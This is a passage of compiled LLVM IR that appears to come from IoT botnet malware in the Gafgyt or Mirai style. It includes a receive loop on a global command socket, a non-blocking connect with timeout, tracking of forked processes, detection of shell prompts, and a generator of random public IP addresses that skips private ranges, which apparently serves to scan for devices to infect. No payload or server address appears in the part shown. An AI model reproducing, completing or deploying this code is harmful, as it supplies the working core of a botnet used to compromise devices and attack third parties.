  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* noundef %27) #11
  %29 = call i64 @send(i32 noundef %25, i8* noundef %26, i64 noundef %28, i32 noundef 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* noundef %31) #10
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #3

; Function Attrs: nounwind
declare void @free(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @wildString(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* noundef %15, i8* noundef %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* noundef %25, i8* noundef %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* noundef %44, i8* noundef %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 noundef %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 noundef %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* noundef %66, i8* noundef %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getHost(i8* noundef %0, %struct.in_addr* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* noundef %7) #10
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomStr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !22

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recvLine(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !23

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 noundef %52, %struct.fd_set* noundef %8, %struct.fd_set* noundef null, %struct.fd_set* noundef %8, %struct.timeval* noundef %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %98

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %93, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %97

59:                                               ; preds = %56
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %63

63:                                               ; preds = %73, %62
  %64 = load i32, i32* %14, align 4
  %65 = zext i32 %64 to i64
  %66 = icmp ult i64 %65, 16
  br i1 %66, label %67, label %76

67:                                               ; preds = %63
  %68 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %69 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %68, i32 0, i32 0
  %70 = load i32, i32* %14, align 4
  %71 = zext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %69, i64 0, i64 %71
  store i64 0, i64* %72, align 8
  br label %73

73:                                               ; preds = %67
  %74 = load i32, i32* %14, align 4
  %75 = add i32 %74, 1
  store i32 %75, i32* %14, align 4
  br label %63, !llvm.loop !24

76:                                               ; preds = %63
  br label %77

77:                                               ; preds = %76
  %78 = load i32, i32* %5, align 4
  %79 = srem i32 %78, 64
  %80 = zext i32 %79 to i64
  %81 = shl i64 1, %80
  %82 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %83 = load i32, i32* %5, align 4
  %84 = sdiv i32 %83, 64
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [16 x i64], [16 x i64]* %82, i64 0, i64 %85
  %87 = load i64, i64* %86, align 8
  %88 = or i64 %87, %81
  store i64 %88, i64* %86, align 8
  %89 = load i32, i32* %5, align 4
  %90 = add nsw i32 %89, 1
  %91 = call i32 @select(i32 noundef %90, %struct.fd_set* noundef %8, %struct.fd_set* noundef null, %struct.fd_set* noundef %8, %struct.timeval* noundef %9)
  store i32 %91, i32* %12, align 4
  %92 = icmp sle i32 %91, 0
  br i1 %92, label %93, label %96

93:                                               ; preds = %77
  %94 = load i32, i32* %13, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %13, align 4
  br label %56, !llvm.loop !25

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96, %56
  br label %98

98:                                               ; preds = %97, %39
  store i32 0, i32* %18, align 4
  %99 = load i8*, i8** %6, align 8
  store i8* %99, i8** %17, align 8
  br label %100

100:                                              ; preds = %118, %98
  %101 = load i32, i32* %7, align 4
  %102 = add nsw i32 %101, -1
  store i32 %102, i32* %7, align 4
  %103 = icmp sgt i32 %101, 1
  br i1 %103, label %104, label %121

104:                                              ; preds = %100
  %105 = load i32, i32* @mainCommSock, align 4
  %106 = call i64 @recv(i32 noundef %105, i8* noundef %16, i64 noundef 1, i32 noundef 0)
  %107 = icmp ne i64 %106, 1
  br i1 %107, label %108, label %110

108:                                              ; preds = %104
  %109 = load i8*, i8** %17, align 8
  store i8 0, i8* %109, align 1
  store i32 -1, i32* %4, align 4
  br label %124

110:                                              ; preds = %104
  %111 = load i8, i8* %16, align 1
  %112 = load i8*, i8** %17, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %17, align 8
  store i8 %111, i8* %112, align 1
  %114 = load i8, i8* %16, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 10
  br i1 %116, label %117, label %118

117:                                              ; preds = %110
  br label %121

118:                                              ; preds = %110
  %119 = load i32, i32* %18, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %18, align 4
  br label %100, !llvm.loop !26

121:                                              ; preds = %117, %100
  %122 = load i8*, i8** %17, align 8
  store i8 0, i8* %122, align 1
  %123 = load i32, i32* %18, align 4
  store i32 %123, i32* %4, align 4
  br label %124

124:                                              ; preds = %121, %108
  %125 = load i32, i32* %4, align 4
  ret i32 %125
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @connectTimeout(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 noundef %19, i32 noundef 3, i8* noundef null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 noundef %24, i32 noundef 4, i64 noundef %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 noundef zeroext %29) #12
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* noundef %32, %struct.in_addr* noundef %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 noundef %40, %struct.sockaddr* noundef %41, i32 noundef 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #12
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !27

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 noundef %82, %struct.fd_set* noundef null, %struct.fd_set* noundef %11, %struct.fd_set* noundef null, %struct.timeval* noundef %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 noundef %86, i32 noundef 1, i32 noundef 4, i8* noundef %87, i32* noundef %13) #10
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 noundef %98, i32 noundef 3, i8* noundef null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 noundef %103, i32 noundef 4, i64 noundef %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #6

declare i32 @connect(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #10
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 noundef %15) #10
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !28

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* noundef %44) #10
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @matchPrompt(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.472, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* noundef %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* noundef %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !29

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !30

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #10
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #10
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #10
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #10
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

14:                                               ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

18:                                               ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

22:                                               ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

26:                                               ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

30:                                               ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
